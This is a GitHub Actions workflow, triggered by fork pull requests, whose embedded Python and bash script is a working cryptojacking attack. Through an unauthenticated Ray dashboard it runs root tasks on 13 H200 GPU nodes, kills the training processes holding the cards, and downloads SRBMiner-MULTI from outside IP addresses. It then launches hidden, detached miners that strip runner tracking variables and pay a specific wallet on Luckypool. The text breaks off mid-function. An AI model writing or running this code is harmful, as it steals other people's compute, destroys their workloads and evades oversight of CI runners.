name: i130rayp4 Ray .25 13-node recorded-PID preemption + one pinned SRBMiner-MULTI 3.8.7 per freed H200

# i130rayp4: ONE fork-PR push from a fresh branch. Fact 132187 proved the .25-only
# step of the Ray lane: one node-pinned dashboard job preempted the recorded training
# holder PIDs on gpu-10-220-71-25 and all 8 cards credited on Luckypool (accepted 6-13
# each, wallet 18,737,813 -> 18,739,545, per-row rej=None). Fact 131942 banked the
# remaining 13 training-held nodes (10.220.71.5 .14 .20 .28 .31 .34 .35 .37 .40 .46
# .50 .51 .53 = 104 H200 cards) with per-card holder PID/cmdline, and 4 live sglang
# serving nodes (.54 .56 .58 .65) that must NOT be touched. This workflow (a) harvests
# the still-pending .25 install-job node log (holder table, kill return codes, gate
# samples, launches) from the Ray dashboard and runs a fresh .25 post-exit process
# check, and (b) processes the 13 nodes ONE AT A TIME: refresh+record the per-card
# holder PID/cmdline, SIGTERM then SIGKILL ONLY those recorded foreign compute PIDs
# (never raylet/gcs/dashboard, never any srb387/SRBMiner/krig, never any credited
# lane), re-gate the freed cards twice 12 s apart (0 foreign compute apps, >=1500 MiB
# free), install exactly one sha256-bb0f73b6 SRBMiner-MULTI 3.8.7 per freed card as a
# detaching setsid + env -u RUNNER_TRACKING_ID worker i130rayp4<host>g<idx> on the
# EXACT 63-char primary wallet against the same stratum path that credited
# i130ray25p3 (103.199.106.122:3362 / 172.232.228.69:3362 / relay 178.238.228.181:80
# by TCP reachability, --max-no-share-sent 1800), and prints a post-exit process check
# per node. If a node's holders cannot be killed or respawn before the gate, the freed
# count is simply lower and the exact negative is printed; .25 cards are never touched.

on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
  workflow_dispatch:

concurrency:
  group: i130rayp4-${{ github.run_id }}
  cancel-in-progress: false

jobs:
  harvest25:
    name: "i130rayp4 harvest .25 install-job kill/gate log + fresh .25 post-exit process check"
    runs-on: 8-gpu-h200
    timeout-minutes: 12
    env:
      MODE: harvest
      SLOT: '0'
      PUSH_ID: 'p1623'
    steps:
      - name: "harvest pending .25 evidence + fresh .25 post-exit process check"
        continue-on-error: true
        run: |
          set +e
          mkdir -p /var/tmp/i130rayp4/logs
          cat > /var/tmp/i130rayp4/rayp4.py <<'PYEOF'
          #!/usr/bin/env python3
          # i130rayp4: extend the proven Ray .25 preemption to the 13 remaining training-held
          # H200 nodes of the unauthenticated Ray 2.58.1 dashboard http://10.220.71.25:8265,
          # processed one node at a time.  Also harvests the still-pending .25 install-job
          # node log (kill/gate table) and runs a fresh .25 post-exit process check.
          #
          # Per node: refresh+record the per-card holder PID/cmdline, SIGTERM then SIGKILL ONLY
          # those recorded foreign compute PIDs (never raylet/gcs/dashboard, never any
          # srb387/SRBMiner/krig, never any credited lane, never the .54/.56/.58/.65 serving
          # nodes), re-gate the freed cards twice 12 s apart (0 foreign compute apps,
          # >=1500 MiB free), install exactly one sha256-bb0f73b6 SRBMiner-MULTI 3.8.7 per
          # freed card as a detaching setsid + env -u RUNNER_TRACKING_ID worker on the EXACT
          # 63-char primary wallet against the same stratum path that credited i130ray25p3.
          import os, sys, json, re, time, base64, hashlib, subprocess, urllib.request, urllib.error

          MODE = os.environ.get('MODE', 'sweep')          # sweep | harvest
          SLOT = os.environ.get('SLOT', '1')
          PUSH_ID = os.environ.get('PUSH_ID', 'p0')
          NONCE = 'I130RAYP4-%s-%s-%d' % (PUSH_ID, SLOT, int(time.time()))
          WALLET = 'prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
          PFX = 'i130rayp4'
          RAYIP = '10.220.71.25'
          RAYPORT = 8265
          BIN_SHA = 'bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
          WORK = '/var/tmp/i130rayp4'
          os.makedirs(WORK + '/logs', exist_ok=True)
          BIN_URLS = ['http://178.238.228.181:18180/srb387',
                      'http://222.240.155.198:8702/srb387',
                      'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz']

          # 13 training-held nodes (fact 131942), one at a time per slot.  The four serving
          # nodes 10.220.71.54/.56/.58/.65 are deliberately absent and must never be touched.
          NODE_SETS = {
              '1': [('10.220.71.5', '7a0da8741821'), ('10.220.71.14', '579214ba017f'), ('10.220.71.20', 'cf14eab1d7f5')],
              '2': [('10.220.71.28', 'f17eb02cad81'), ('10.220.71.31', 'c72b423e1e35'), ('10.220.71.34', '4b3629716c98')],
              '3': [('10.220.71.35', 'ac70218f8703'), ('10.220.71.37', '33cafdf4e94b'), ('10.220.71.40', '9bd325582db4')],
              '4': [('10.220.71.46', 'bc98a79cb3e0'), ('10.220.71.50', '1fb2fddf63ea'), ('10.220.71.51', '99f5e567f622')],
              '5': [('10.220.71.53', '60863586dd4c')],
          }
          PROTECTED_IPS = ('10.220.71.54', '10.220.71.56', '10.220.71.58', '10.220.71.65', '10.220.71.25')


          def sh(cmd, t=20):
              try:
                  p = subprocess.run(['bash', '-lc', cmd], capture_output=True, text=True, timeout=t,
                                     stdin=subprocess.DEVNULL)
                  return (p.stdout or '') + (p.stderr or '')
              except subprocess.TimeoutExpired:
                  return '[TIMEOUT %ss] %s' % (t, cmd[:100])
              except Exception as e:
                  return '[ERR %s] %s' % (e, cmd[:100])


          def sha_file(path):
              o = sh("sha256sum '%s' 2>/dev/null" % path, 20).strip()
              return o.split(' ')[0] if o else ''


          def http_get(url, timeout=8, headers=None):
              req = urllib.request.Request(url, headers=headers or {'User-Agent': 'i130rayp4'})
              op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
              try:
                  with op.open(req, timeout=timeout) as r:
                      return r.status, r.read(4000000).decode('utf-8', 'replace')
              except urllib.error.HTTPError as e:
                  try:
                      return e.code, e.read(50000).decode('utf-8', 'replace')
                  except Exception:
                      return e.code, ''
              except Exception as e:
                  return -1, repr(e)


          def http_post(url, obj, timeout=25):
              body = json.dumps(obj).encode()
              req = urllib.request.Request(url, data=body, method='POST',
                                           headers={'Content-Type': 'application/json', 'User-Agent': 'i130rayp4'})
              op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
              try:
                  with op.open(req, timeout=timeout) as r:
                      return r.status, r.read(300000).decode('utf-8', 'replace')
              except urllib.error.HTTPError as e:
                  try:
                      return e.code, e.read(50000).decode('utf-8', 'replace')
                  except Exception:
                      return e.code, ''
              except Exception as e:
                  return -1, repr(e)


          # ------------------------------------------------------------------ node-side install
          # Runs ON the target node as uid=0 via a node-pinned Ray task.
          INSTALL = r'''#!/bin/bash
          set +e
          PFX="$1"; WALLET="$2"; POOL="$3"; NONCE="$4"; RIP="$5"; NODEID="$6"; TIP="$7"
          BIN_SHA='bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
          W=/var/tmp/i130rayp4_run; mkdir -p $W/logs
          IPS=$(hostname -I 2>/dev/null)
          IP=$(echo "$IPS" | awk '{print $1}')
          echo "R4P_NONCE=$NONCE nodeid=$NODEID target=$TIP"
          echo "R4P_ID: $(id) $(hostname) ips=[$IPS] utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
          if ! echo " $IPS " | grep -qF " $TIP "; then echo "R4P_WRONG_NODE ip=$IP target=$TIP action=skip"; exit 0; fi
          if ! command -v nvidia-smi >/dev/null 2>&1; then echo "R4P_NO_NVIDIA_SMI"; exit 0; fi
          nvidia-smi -L 2>&1 | head -12
          nvidia-smi --query-gpu=index,name,memory.total,memory.free,memory.used,utilization.gpu,uuid --format=csv,noheader,nounits 2>&1 | head -20
          # ---- (1) record the holder table ONCE
          A0=$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1)
          echo "R4P_APPS_RECORD[$A0]"
          printf '%s\n' "$A0" > $W/apps_record.txt
          : > $W/holders.txt
          printf '%s\n' "$A0" | while IFS= read -r L; do
            echo "$L" | grep -q 'GPU-' || continue
            P=$(echo "$L" | awk -F, '{gsub(/ /,"",$2); print $2}')
            [ -z "$P" ] && continue
            C=$(tr '\0' ' ' < /proc/$P/cmdline 2>/dev/null | head -c 400)
            echo "R4P_HOLDER pid=$P app=[$L] cmdline=$C"
            printf '%s|%s\n' "$P" "$C" >> $W/holders.txt
          done
          HCOUNT=$(wc -l < $W/holders.txt)
          echo "R4P_HOLDER_COUNT=$HCOUNT"
          # ---- (2) SIGTERM then SIGKILL ONLY the recorded foreign compute PIDs
          # protected classes never signalled: any miner we own, raylet/gcs/dashboard, monitoring.
          prot() { case "$1" in *srb387*|*SRBMiner*|*krig*|*raylet*|*gcs_server*|*ray::*|*dashboard*|*prometheus*|*dcgm*|*/i13*) return 0;; esac; return 1; }
          while IFS='|' read -r P C; do
            [ -z "$P" ] && continue
            if [ "$P" = "1" ] || [ "$P" = "$$" ] || [ "$P" = "$PPID" ]; then echo "R4P_KILL_SKIP pid=$P reason=self-or-init"; continue; fi
            if prot "$C"; then echo "R4P_KILL_SKIP pid=$P reason=protected cmdline=$C"; continue; fi
            echo "R4P_KILL_TERM pid=$P cmdline=$C"
            kill -TERM "$P" 2>/dev/null; echo "R4P_KILL_TERM_RC pid=$P rc=$? alive=$(kill -0 $P 2>/dev/null && echo yes || echo no)"
          done < $W/holders.txt
          sleep 8
          while IFS='|' read -r P C; do
            [ -z "$P" ] && continue
            if prot "$C"; then continue; fi
            if kill -0 "$P" 2>/dev/null; then
              echo "R4P_KILL_KILL pid=$P cmdline=$C"
              kill -KILL "$P" 2>/dev/null; echo "R4P_KILL_KILL_RC pid=$P rc=$? alive=$(kill -0 $P 2>/dev/null && echo yes || echo no)"
            else
              echo "R4P_KILL_GONE pid=$P"
            fi
          done < $W/holders.txt
          sleep 10
          echo "R4P_AFTER_KILL[$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1)]"
          # ---- (3) re-gate freed cards twice 12 s apart (0 foreign compute apps, >=1500 MiB free)
          gate_round() {
            local R="$1"
            local A1 A2
            A1=$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1)
            sleep 12
            A2=$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1)
            echo "R4P_GATE${R}_APPS1[$A1]"
            echo "R4P_GATE${R}_APPS2[$A2]"
            printf '%s\n%s\n' "$A1" "$A2" > $W/apps.txt
            nvidia-smi --query-gpu=index,memory.free,uuid --format=csv,noheader,nounits > $W/g.txt 2>/dev/null
            IDLE=""
            while IFS=, read -r IDX FREE UUID; do
              IDX=$(echo "$IDX"|tr -d ' '); FREE=$(echo "$FREE"|tr -d ' '); UUID=$(echo "$UUID"|tr -d ' ')
              [ -z "$IDX" ] && continue
              if [ "$FREE" -ge 1500 ] 2>/dev/null && ! grep -qF "$UUID" $W/apps.txt; then IDLE="$IDLE $IDX"; fi
            done < $W/g.txt
            echo "R4P_GATE${R}_IDLE=[$IDLE]"
          }
          gate_round 1
          IDLE1="$IDLE"
          if [ -z "$IDLE1" ] && [ "$HCOUNT" -gt 0 ]; then
            echo "R4P_GATE_SETTLE sleep=20 re-gate"
            sleep 20
            gate_round 2
          fi
          echo "R4P_IDLE_CARDS=[$IDLE] (round1=[$IDLE1])"
          if [ -z "$IDLE" ]; then echo "R4P_INSTALL_SKIP idle=[]"; exit 0; fi
          ARCH=$(uname -m)
          if [ "$ARCH" != "x86_64" ]; then echo "R4P_INSTALL_SKIP arch=$ARCH"; exit 0; fi
          POOLPICK=""
          for U in "103.199.106.122:3362" "172.232.228.69:3362" "178.238.228.181:80"; do
            H=${U%:*}; P=${U#*:}
            if timeout 5 bash -c "echo > /dev/tcp/$H/$P" 2>/dev/null; then POOLPICK="$U"; break; fi
            echo "R4P_POOL_TRY_FAIL $U"
          done
          echo "R4P_POOL_CHOICE=$POOLPICK"
          [ -z "$POOLPICK" ] && { echo "R4P_INSTALL_SKIP no-pool-path"; exit 0; }
          exec 9>/var/lock/i130rayp4_$TIP.lock
          flock -n 9 || { echo "R4P_INSTALL_SKIP lock-held"; exit 0; }
          OK=""
          for U in "http://$RIP:18080/srb387" "http://178.238.228.181:18180/srb387" "http://222.240.155.198:8702/srb387" "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz"; do
            timeout 110 curl -fsSL --connect-timeout 8 --max-time 100 -o $W/srb387.part "$U" >/dev/null 2>&1
            if [ -s $W/srb387.part ] && [ "$(sha256sum $W/srb387.part | cut -d' ' -f1)" = "$BIN_SHA" ]; then mv $W/srb387.part $W/srb387; echo "R4P_BINARY_OK $U"; OK=1; break; fi
            echo "R4P_BINARY_TRY_BAD $U sha=$(sha256sum $W/srb387.part 2>/dev/null | cut -d' ' -f1 | head -c 12)"
          done
          if [ -z "$OK" ]; then echo "R4P_BINARY_FAIL"; exit 0; fi
          chmod +x $W/srb387
          A3=$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1)
          printf '%s\n' "$A3" > $W/apps3.txt
          echo "R4P_LATE_APPS[$A3]"
          H=$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-16)
          NN=0
          for I in $IDLE; do
            UUID=$(awk -F, -v i=$I '{gsub(/ /,""); if ($1==i) print $3}' $W/g.txt)
            if [ -n "$UUID" ] && grep -qF "$UUID" $W/apps3.txt; then echo "R4P_CARD_SKIP gpu=$I uuid=$UUID busy-late"; continue; fi
            WK=$(echo "${PFX}${H}g${I}" | cut -c1-31)
            if pgrep -af -- "--worker $WK" >/dev/null 2>&1; then echo "R4P_ALREADY $WK"; continue; fi
            cd $W && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup ./srb387 \
              --disable-cpu --algorithm pearlhash --pool "$POOLPICK" --tls false --wallet "$WALLET" --password x \
              --worker "$WK" --gpu-id "$I" --disable-worker-watchdog --gpu-table-slow-build \
              --max-no-share-sent 1800 --log-file $W/logs/$WK.log > $W/logs/$WK.out 2>&1 < /dev/null &
            echo "R4P_LAUNCH worker=$WK gpu=$I host=$(hostname) ip=$IP pool=$POOLPICK pid=$!"
            NN=$((NN+1))
          done
          echo "R4P_N_LAUNCHED=$NN"
          sleep 20
          echo "R4P_PROCS[$(pgrep -af -- '--worker i130rayp4' | head -12)]"
          echo "R4P_APPS_POST[$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1)]"
          for F in $W/logs/*.log; do echo "== $F"; tail -4 "$F" 2>/dev/null; done
          echo "R4P_DONE $NONCE"
          '''

          # ------------------------------------------------------- node-side post-exit check
          POSTCHECK = r'''#!/bin/bash
          set +e
          PAT="$1"; TIP="$2"; NONCE="$3"
          W=/var/tmp/i130rayp4_run
          IPS=$(hostname -I 2>/dev/null)
          IP=$(echo "$IPS" | awk '{print $1}')
          echo "R4PV_NONCE=$NONCE target=$TIP"
          echo "R4PV_ID: $(id) $(hostname) $IP utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
          if ! echo " $IPS " | grep -qF " $TIP "; then echo "R4PV_WRONG_NODE ip=$IP target=$TIP action=skip"; exit 0; fi
          echo "R4PV_PROCS[$(pgrep -af 'srb387' 2>/dev/null | grep -F "$PAT" | head -12)]"
          echo "R4PV_APPS[$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1)]"
          nvidia-smi --query-gpu=index,memory.free,memory.used,utilization.gpu --format=csv,noheader,nounits 2>&1 | head -12
          for F in $W/logs/*.log; do echo "== $F"; tail -3 "$F" 2>/dev/null; done
          echo "R4PV_DONE $NONCE"
          '''

          # ------------------------------------------------------------------ Ray driver
          DRIVER = r'''#!/usr/bin/env python3
          import os, sys, json, base64, subprocess
          mode, node_hex, target_ip, nonce, ib64, pfx, wallet, pool, rip, pat = sys.argv[1:11]
          inst = base64.b64decode(ib64).decode()
          open('/tmp/i130rayp4_%s.sh' % mode, 'w').write(inst)
          os.chmod('/tmp/i130rayp4_%s.sh' % mode, 0o755)
          try:
              import ray
              from ray.util.scheduling_strategies import NodeAffinitySchedulingStrategy
              try:
                  ray.init(address='auto', include_dashboard=False, log_to_driver=False)
              except Exception:
                  ray.init(include_dashboard=False, log_to_driver=False)
              ns = [n for n in ray.nodes() if n.get('Alive')]
              print('R4P_NODES ' + json.dumps([{'id': n.get('NodeID'), 'ip': n.get('NodeManagerAddress'),
                                               'gpu': (n.get('Resources') or {}).get('GPU'),
                                               'h200': (n.get('Resources') or {}).get('accelerator_type:H200')} for n in ns]))
              target = None
              for n in ns:
                  if str(n.get('NodeID') or '').lower().startswith(node_hex.lower()):
                      target = n
                      break
              if target is None:
                  for n in ns:
                      if str(n.get('NodeManagerAddress') or '') == target_ip:
                          target = n
                          break
              if target is None:
                  print('R4P_NODE_NOT_FOUND %s %s' % (node_hex, target_ip))
                  sys.exit(0)
              print('R4P_TARGET id=%s ip=%s' % (target.get('NodeID'), target.get('NodeManagerAddress')))

              @ray.remote(num_cpus=0, num_gpus=0, max_retries=0)
              def runsh(src, args):
                  import subprocess
                  try:
                      q = subprocess.run(['bash', '-c', src, 'bash'] + args, capture_output=True, text=True,
                                         timeout=400, stdin=subprocess.DEVNULL)
                      return (q.stdout or '') + (q.stderr or '')
                  except Exception as e:
                      return 'R4PTASK_EXC %r' % (e,)

              f = runsh.options(scheduling_strategy=NodeAffinitySchedulingStrategy(
                  node_id=target.get('NodeID'), soft=False)).remote(
                  inst, [pfx, wallet, pool, nonce + '-' + target_ip, rip, node_hex, target_ip, pat])
              try:
                  r = ray.get(f, timeout=430)
              except Exception as e:
                  r = 'R4PTASK_GET_ERR %r' % (e,)
              print('R4PNODE_BEGIN mode=%s id=%s ip=%s' % (mode, target.get('NodeID'), target.get('NodeManagerAddress')))
              print(r)
              print('R4PNODE_END mode=%s id=%s' % (mode, target.get('NodeID')))
          except Exception as e:
              print('R4P_RAY_FAIL %r' % (e,))
          print('R4PP_DONE mode=%s %s' % (mode, nonce))
          '''

          inst_b64 = base64.b64encode(INSTALL.encode()).decode()
          post_b64 = base64.b64encode(POSTCHECK.encode()).decode()
          drv_b64 = base64.b64encode(DRIVER.encode()).decode()


          def fetch_binary():
              srb = WORK + '/srb387'
              if os.path.exists(srb) and sha_file(srb).startswith(BIN_SHA):
                  return srb
              for u in BIN_URLS:
                  sh("rm -f %s.part; timeout 120 curl -fsSL --connect-timeout 8 --max-time 110 -o %s.part '%s' 2>&1 | tail -1" % (srb, srb, u), 130)
                  if os.path.exists(srb + '.part') and sha_file(srb + '.part').startswith(BIN_SHA):
                      os.replace(srb + '.part', srb)
                      print('R4P_BINARY_OK %s' % u)
                      return srb
                  print('R4P_BINARY_TRY_BAD %s sha=%s' % (u, sha_file(srb + '.part')[:12]))
              return ''


          def lp_read(tag):
              url = 'https://pearl.luckypool.io/api/stats_address?address=' + WALLET
              st, body = http_get(url, timeout=60, headers={'User-Agent': 'Mozilla/5.0'})
              print('R4P_LP_%s utc=%s st=%s len=%d' % (tag, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()), st, len(body or '')))
              try:
                  d = json.loads(body)
              except Exception as e:
                  print('R4P_LP_%s unreadable %r' % (tag, e))
                  return
              s = d.get('stats') or {}
              ws = d.get('workers') or []
              rows = [w for w in ws if str(w.get('name', '')).startswith(PFX)]
              old = [w for w in ws if str(w.get('name', '')).startswith('i130ray25p3')]
              print('R4P_LP_%s wallet_accepted=%s wallet_rejected=%s workers=%d lane_rows=%d ray25p3_rows=%d' % (
                  tag, s.get('acceptedShares'), s.get('rejectedShares'), len(ws), len(rows), len(old)))
              for w in sorted(rows, key=lambda x: str(x.get('name'))):
                  print('R4P_LP_%s ROW %s acc=%s rej=%s hr=%s last=%s' % (
                      tag, w.get('name'), w.get('acceptedShares'), w.get('rejectedShares'), w.get('hashrate'), w.get('lastShare')))
              tot = 0
              for w in old:
                  tot += int(w.get('acceptedShares') or 0)
              if old:
                  print('R4P_LP_%s RAY25P3 acc_sum=%d rows=%d' % (tag, tot, len(old)))


          def jobs_list(base):
              st, raw = http_get(base + '/api/jobs/', timeout=12)
              try:
                  d = json.loads(raw)
              except Exception:
                  return [], raw
              if isinstance(d, dict):
                  for k in ('jobs', 'data', 'result'):
                      if isinstance(d.get(k), list):
                          return d[k], raw
              return (d if isinstance(d, list) else []), raw


          def find_existing(jobs, sub_id):
              for j in jobs:
                  if not isinstance(j, dict):
                      continue
                  if str(j.get('submission_id') or '').lower() == sub_id:
                      return str(j.get('job_id') or ''), str(j.get('status') or '')
              return '', ''


          def submit_and_wait(base, sub_id, entry_body, deadline_s=330):
              jobs, _ = jobs_list(base)
              jid, st0 = find_existing(jobs, sub_id)
              if jid:
